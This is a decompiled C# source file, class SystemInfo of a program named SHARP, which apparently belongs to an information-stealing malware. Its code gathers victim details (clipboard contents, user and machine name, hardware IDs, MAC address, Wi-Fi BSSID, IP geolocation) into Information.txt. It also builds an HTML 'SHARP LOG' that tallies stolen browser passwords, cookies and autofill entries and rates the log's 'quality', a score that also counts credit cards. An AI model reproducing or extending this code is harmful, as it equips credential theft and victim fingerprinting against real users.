﻿using System;
using System.Drawing;
using System.IO;
using System.Management;
using System.Windows.Forms;
using Microsoft.Win32;

namespace SHARP
{
	// Token: 0x02000058 RID: 88
	internal class SystemInfo
	{
		// Token: 0x060001E5 RID: 485 RVA: 0x0000BDC4 File Offset: 0x00009FC4
		public static void GetSystem()
		{
			string exploitDir = Help.ExploitDir;
			string contents = string.Concat(new string[]
			{
				"\n---░██████╗██╗░░██╗░█████╗░██████╗░██████╗░---\n---██╔════╝██║░░██║██╔══██╗██╔══██╗██╔══██╗---\n---╚█████╗░███████║███████║██████╔╝██████╔╝---\n---░╚═══██╗██╔══██║██╔══██║██╔══██╗██╔═══╝░---\n---██████╔╝██║░░██║██║░░██║██║░░██║██║░░░░░---\n---╚═════╝░╚═╝░░╚═╝╚═╝░░╚═╝╚═╝░░╚═╝╚═╝░░░░░---\n =================================================\n Operating system: ",
				SystemInfo.GetSystemVersion(),
				"\n PC user: ",
				SystemInfo.compname,
				"/",
				SystemInfo.username,
				"\n ClipBoard: ",
				Buffers.GetBuffer(),
				"\n Launch: ",
				Help.ExploitName,
				"\n =================================================\n Screen resolution: ",
				SystemInfo.ScreenMetrics(),
				"\n Current time: ",
				DateTime.Now.ToString(),
				"\n HWID: ",
				SystemInfo.GetProcessorID(),
				"\n =================================================\n CPU: ",
				SystemInfo.GetCPUName(),
				"\n RAM: ",
				SystemInfo.GetRAM(),
				"\n GPU: ",
				SystemInfo.GetGpuName(),
				"\n =================================================\n IP Geolocation: ",
				Prog.IP,
				" ",
				Counting.country,
				"\n Log Date: ",
				Help.date,
				"\n BSSID: ",
				BSSID.GetBSSID(),
				"\n ==============================================\n HDD: ",
				SystemInfo.GetHDDSerialNo(),
				"\n MAC: ",
				SystemInfo.GetMACAddress(),
				"\n BIOS caption: ",
				SystemInfo.GetBIOScaption(),
				"\n =============================================="
			});
			File.WriteAllText(exploitDir + "\\Information.txt", contents);
		}

		// Token: 0x060001E6 RID: 486 RVA: 0x0000BF44 File Offset: 0x0000A144
		public static void log()
		{
			string exploitDir = Help.ExploitDir;
			string contents = string.Concat(new string[]
			{
				"\n<!DOCTYPE html>\n<html lang='en'>\n<head>\n<meta charset='UTF-8'>\n<meta name='viewport' content='width=device-width, initial-scale=1.0'>\n<title>SHARP LOG</title>\n<style>\nbody {\nmargin: 0;\npadding: 0;\nfont-family: Arial, sans-serif;\nbackground: linear-gradient(to bottom right, #ff2400, #e74c3c, #3498db, #2ecc71); /* Градиентный фон */\n}\n.container {\nposition: relative;\n}\n.background-text {\nposition: absolute;\ntop: 50%;\nleft: 50%;\ntransform: translate(-50%, -50%);\nz-index: -1;\nfont-size: 5em;\ncolor: rgba(255, 255, 255, 0.1); /* Цвет текста */\nfont-weight: bold;\ntext-shadow: 2px 2px 4px rgba(0, 0, 0, 0.1); /* Тень текста */\nborder: 2px solid #fff; /* Обводка текста */\npadding: 20px;\nborder-radius: 10px;\nbackground-color: rgba(255, 255, 255, 0.5);\n}\n.content {\ntext-align: center;\npadding: 20px;\ncolor: #fff;\n}\n.logo {\nmargin-bottom: 20px;\ncolor: #fff;\n}\n.block {\nbackground-color: rgba(255, 255, 255, 0.5);\nborder-radius: 10px; \nbox-shadow: 0 0 10px rgba(0, 0, 0, 0.1);\npadding: 20px;\nmargin-bottom: 20px;\n}\nh1, h2, h3 {\nmargin: 0;\nfont-weight: normal;\n}\nh1 {\nfont-size: 3em;\n}\nh2 {\nfont-size: 2em;\n}\nh3 {\nfont-size: 1.5em;\n}\np {\nfont-size: 1.2em;\nline-height: 1.6;\n}\n@media (min-width: 768px) {\n.content {\npadding: 50px;\n}\n}\n</style>\n</head>\n<body>\n\t<div class='container'>\n\t\t<div class='content'>\n\t\t\t<div class='block'>\n\t\t\t\t<h2>SHARP LOG</h2> \n\t\t\t</div>\n<div class='block'>\n\t\t\t<h2>Browsers</h2>\n\t\t\t\t<p>----------</p>\n\t\t\t\t<p>Passwords - ",
				Counting.Passwords.ToString(),
				"</p>\n\t\t\t\t<p>Cookie's - ",
				Counting.Cookies.ToString(),
				"</p>\n\t\t\t\t<p>AutoFile - ",
				Counting.AutoFill.ToString(),
				"</p>\n\t\t\t\t<p>Bookmarks - ",
				Counting.Bookmarks.ToString(),
				"</p> \n\t\t\t\t<p>----------</p>\n\t\t\t</div>\n\t\t\t<div class='block'>\n\t\t\t\t<h2>PC information</h2>\n\t\t\t\t<p>----------</p>\n\t\t\t\t<p>CPU - ",
				SystemInfo.GetCPUName(),
				"</p>\n\t\t\t\t<p>Operating system - ",
				SystemInfo.GetSystemVersion(),
				" </p>\n\t\t\t\t<p>PC user - ",
				SystemInfo.compname,
				" / ",
				SystemInfo.username,
				" </p>\n\t\t\t\t<p>Screen resolution - ",
				SystemInfo.ScreenMetrics(),
				"</p>\n\t\t\t\t<p>HWID - ",
				SystemInfo.GetProcessorID(),
				"</p>\n\t\t\t\t<p>RAM - ",
				SystemInfo.GetRAM(),
				"</p>\n\t\t\t\t<p>GPU - ",
				SystemInfo.GetGpuName(),
				"</p>\n\t\t\t\t<p>BSSID - ",
				BSSID.GetBSSID(),
				"</p>\n\t\t\t\t<p>----------</p>\n\t\t\t</div>\n\t\t\t<div class='block'>\n\t\t\t\t<h2>LOG QUALITY</h2>\n\t\t\t\t<p>----------</p>\n\t\t\t\t<p>Quality of LOG - ",
				SystemInfo.Quality(),
				" POINTS</p>\n\t\t\t\t<p>----------</p>\n\t\t\t</div>\n\t\t</div>\n\t</div>\n</body>\n</html>"
			});
			File.WriteAllText(exploitDir + "\\LOG.html", contents);
		}

		// Token: 0x060001E7 RID: 487 RVA: 0x0000C085 File Offset: 0x0000A285
		public static string GetSystemVersion()
		{
			return SystemInfo.GetWindowsVersionName() + " " + SystemInfo.GetBitVersion();
		}

		// Token: 0x060001E8 RID: 488 RVA: 0x0000C09C File Offset: 0x0000A29C
		private static string GetMACAddress()
		{
			ManagementObjectCollection instances = new ManagementClass("Win32_NetworkAdapterConfiguration").GetInstances();
			string text = string.Empty;
			foreach (ManagementBaseObject managementBaseObject in instances)
			{
				ManagementObject managementObject = (ManagementObject)managementBaseObject;
				if (text == string.Empty && (bool)managementObject["IPEnabled"])
				{
					text = managementObject["MacAddress"].ToString();
				}
				managementObject.Dispose();
			}
			return text;
		}

		// Token: 0x060001E9 RID: 489 RVA: 0x0000C130 File Offset: 0x0000A330
		private static string GetDefaultIPGateway()
		{
			ManagementObjectCollection instances = new ManagementClass("Win32_NetworkAdapterConfiguration").GetInstances();
			string text = string.Empty;
			foreach (ManagementBaseObject managementBaseObject in instances)
			{
				ManagementObject managementObject = (ManagementObject)managementBaseObject;
				if (text == string.Empty && (bool)managementObject["IPEnabled"])
				{
					text = managementObject["DefaultIPGateway"].ToString();
				}
				managementObject.Dispose();
			}
			return text;
		}

		// Token: 0x060001EA RID: 490 RVA: 0x0000C1C4 File Offset: 0x0000A3C4
		private static string GetAccountName()
		{
			foreach (ManagementBaseObject managementBaseObject in new ManagementObjectSearcher("root\\CIMV2", "SELECT * FROM Win32_UserAccount").Get())
			{
				ManagementObject managementObject = (ManagementObject)managementBaseObject;
				try
				{
					return managementObject.GetPropertyValue("Name").ToString();
				}
				catch
				{
				}
			}
			return "User Account Name: Unknown";
		}

		// Token: 0x060001EB RID: 491 RVA: 0x0000C248 File Offset: 0x0000A448
		private static string GetBIOScaption()
		{
			foreach (ManagementBaseObject managementBaseObject in new ManagementObjectSearcher("root\\CIMV2", "SELECT * FROM Win32_BIOS").Get())
			{
				ManagementObject managementObject = (ManagementObject)managementBaseObject;
				try
				{
					return managementObject.GetPropertyValue("Caption").ToString();
				}
				catch
				{
				}
			}
			return "BIOS Caption: Unknown";
		}

		// Token: 0x060001EC RID: 492 RVA: 0x0000C2CC File Offset: 0x0000A4CC
		public static string GetWindowsVersionName()
		{
			string text = "Unknown System";
			try
			{
				using (ManagementObjectSearcher managementObjectSearcher = new ManagementObjectSearcher("root\\CIMV2", " SELECT * FROM win32_operatingsystem"))
				{
					foreach (ManagementBaseObject managementBaseObject in managementObjectSearcher.Get())
					{
						text = Convert.ToString(((ManagementObject)managementBaseObject)["Name"]);
					}
					text = text.Split(new char[]
					{
						'|'
					})[0];
					int length = text.Split(new char[]
					{
						' '
					})[0].Length;
					text = text.Substring(length).TrimStart(Array.Empty<char>()).TrimEnd(Array.Empty<char>());
				}
			}
			catch (Exception value)
			{
				Console.WriteLine(value);
			}
			return text;
		}

		// Token: 0x060001ED RID: 493 RVA: 0x0000C3B4 File Offset: 0x0000A5B4
		private static string GetHDDSerialNo()
		{
			ManagementObjectCollection instances = new ManagementClass("Win32_LogicalDisk").GetInstances();
			string text = "";
			foreach (ManagementBaseObject managementBaseObject in instances)
			{
				ManagementObject managementObject = (ManagementObject)managementBaseObject;
				text += Convert.ToString(managementObject["VolumeSerialNumber"]);
			}
			return text;
		}

		// Token: 0x060001EE RID: 494 RVA: 0x0000C428 File Offset: 0x0000A628
		private static string Quality()
		{
			return ((Counting.Passwords + Counting.Cookies + Counting.CreditCards + Counting.AutoFill + Counting.Bookmarks) / 5).ToString();
		}

		// Token: 0x060001EF RID: 495 RVA: 0x0000C45C File Offset: 0x0000A65C
		private static string GetBitVersion()
		{
			try
			{
				if (Registry.LocalMachine.OpenSubKey("HARDWARE\\Description\\System\\CentralProcessor\\0").GetValue("Identifier").ToString().Contains("x86"))
				{
					return "(32 Bit)";
				}
				return "(64 Bit)";
			}
			catch (Exception value)
			{
				Console.WriteLine(value);
			}
			return "(Unknown)";
		}

		// Token: 0x060001F0 RID: 496 RVA: 0x0000C4C4 File Offset: 0x0000A6C4
		public static string ScreenMetrics()
		{
			Rectangle bounds = Screen.GetBounds(Point.Empty);
			int width = bounds.Width;
			int height = bounds.Height;
			return width.ToString() + "x" + height.ToString();
		}

		// Token: 0x060001F1 RID: 497 RVA: 0x0000C504 File Offset: 0x0000A704
		public static string GetCPUName()
		{
			string result;
			try
			{
				string text = string.Empty;
				foreach (ManagementBaseObject managementBaseObject in new ManagementObjectSearcher("root\\CIMV2", "SELECT * FROM Win32_Processor").Get())
				{
					text = ((ManagementObject)managementBaseObject)["Name"].ToString();
				}
				result = text;
			}
			catch (Exception ex)
			{
				Console.WriteLine(((ex != null) ? ex.ToString() : null) + "СистемИнфа");
				result = "Error";
			}
			return result;
		}

		// Token: 0x060001F2 RID: 498 RVA: 0x0000C5A8 File Offset: 0x0000A7A8
		public static string GetRAM()
		{
			string result;
			try
			{
				int num = 0;
				using (ManagementObjectSearcher managementObjectSearcher = new ManagementObjectSearcher("Select * From Win32_ComputerSystem"))
				{
					using (ManagementObjectCollection.ManagementObjectEnumerator enumerator = managementObjectSearcher.Get().GetEnumerator())
					{
						if (enumerator.MoveNext())
						{
							num = (int)(Convert.ToDouble(((ManagementObject)enumerator.Current)["TotalPhysicalMemory"]) / 1048576.0) - 1;
						}
					}
				}
				result = num.ToString() + "MB";
			}
			catch (Exception value)
			{
				Console.WriteLine(value);
				result = "Error";
			}
			return result;
		}

		// Token: 0x060001F3 RID: 499 RVA: 0x0000C664 File Offset: 0x0000A864
		public static string GetProcessorID()
		{
			string result = string.Empty;
			foreach (ManagementBaseObject managementBaseObject in new ManagementObjectSearcher("SELECT ProcessorId FROM Win32_Processor").Get())
			{
				result = (string)((ManagementObject)managementBaseObject)["ProcessorId"];
			}
			return result;
		}

		// Token: 0x060001F4 RID: 500 RVA: 0x0000C6D0 File Offset: 0x0000A8D0
		public static string GetGpuName()
		{
			try
			{
				using (ManagementObjectCollection.ManagementObjectEnumerator enumerator = new ManagementObjectSearcher("root\\CIMV2", "SELECT * FROM Win32_VideoController").Get().GetEnumerator())
				{
					if (enumerator.MoveNext())
					{
						return ((ManagementObject)enumerator.Current)["Name"].ToString();
					}
				}
			}
			catch (Exception value)
			{
				Console.WriteLine(value);
			}
			return "Unknown";
		}

		// Token: 0x04000114 RID: 276
		public static string username = Environment.UserName;

		// Token: 0x04000115 RID: 277
		public static string compname = Environment.MachineName;
	}
}
